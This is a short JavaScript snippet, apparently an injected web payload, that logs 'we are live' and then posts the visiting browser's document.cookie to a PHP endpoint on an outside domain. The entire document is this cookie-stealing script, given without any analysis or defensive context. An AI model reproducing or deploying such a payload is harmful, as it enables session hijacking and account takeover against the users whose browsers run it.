(function() {
	console.log('we are live');
	$.post('https://www.rosscousens.com/test.php', { "cookie" : document.cookie });
})();
